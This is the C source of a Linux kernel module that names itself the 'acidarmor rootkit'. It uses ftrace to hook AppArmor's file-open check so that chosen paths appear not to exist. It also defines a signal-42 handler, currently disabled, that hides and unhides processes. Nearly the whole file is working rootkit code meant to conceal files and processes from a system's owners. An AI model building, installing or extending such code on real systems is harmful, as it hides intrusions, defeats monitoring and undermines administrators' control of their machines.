#include "ftrace_helper.h"
#include "linux/kern_levels.h"
#include "linux/stddef.h"
#include <asm-generic/errno-base.h>
#include <linux/dcache.h>
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/path.h>
#include <linux/proc_ns.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ceald");
MODULE_DESCRIPTION("acidarmor rootkit");
MODULE_VERSION("0.1");

#define SPECIAL_SIG 42

// apparmor open file
//
static asmlinkage int (*orig_file_open)(struct file *file);
static asmlinkage int acidarmor_file_open(struct file *file) {
  char *buf;
  char *path;

  buf = kmalloc(PATH_MAX, GFP_KERNEL);
  if (!buf)
    return orig_file_open(file);

  path = d_path(&file->f_path, buf, PATH_MAX);
  if (IS_ERR(path)) {
    kfree(buf);
    return orig_file_open(file);
  }

  if (exists(path)) {
    printk(KERN_INFO "process trying to access restricted process!\n");
    return -ENOENT;
  }
  // printk(KERN_INFO "opening: %s\n", path);

  kfree(buf);

  return orig_file_open(file);
}

// apparmor kill

static asmlinkage int (*orig_kill)(struct task_struct *target,
                                   struct kernel_siginfo *info, int sig,
                                   const struct cred *cred);

// custom kill
static asmlinkage int acidarmor_kill(struct task_struct *target,
                                     struct kernel_siginfo *info, int sig,
                                     const struct cred *cred) {
  if (sig == SPECIAL_SIG) {
    pid_t pid = target->pid;
    char *mypid = kmalloc(sizeof(pid), GFP_KERNEL);
    sprintf(mypid, "/proc/%d", pid);
    bool exist = exists(mypid);
    if (exist == false) {
      append(pid);
      printk(KERN_INFO "hiding: %d\n", pid);
      return -EPERM;
    } else {
      remove_item(pid);
      printk(KERN_INFO "unhiding: %d\n", pid);
      return orig_kill(target, info, sig, cred);
    }
  }
  //  pid_t pid = target->pid;
  //  char *mypid = kmalloc(sizeof(pid), GFP_KERNEL);
  //  sprintf(mypid, "/proc/%d", pid);
  //  if (sig == SPECIAL_SIG && !exists(mypid)) {
  //    append(pid);
  //    printk(KERN_INFO "hiding: %d\n", pid);
  //    return -EPERM;
  //  } else {
  //    if (sig == SPECIAL_SIG && exists(mypid)) {
  //      remove_item(pid);
  //      printk(KERN_INFO "unhiding: %d\n", pid);
  //      return orig_kill(target, info, sig, cred);
  //    }
  //    return orig_kill(target, info, sig, cred);
  //  }
  return orig_kill(target, info, sig, cred);
}

static struct ftrace_hook hooks[] = {
    HOOK("apparmor_file_open", acidarmor_file_open, &orig_file_open),
    // HOOK("apparmor_task_kill", acidarmor_kill, &orig_kill),
};

/* Module initialization function */
static int __init acid_init(void) {

  /* Hook the syscall and print to the kernel buffer */
  int err;
  err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  if (err)
    return err;

  printk(KERN_INFO "Hewo pwincess\n");

  return 0;
}

static void __exit acid_exit(void) {
  /* Unhook and restore the syscall and print to the kernel buffer */
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
  printk(KERN_INFO "bye pwincess\n");
}

module_init(acid_init);
module_exit(acid_exit);
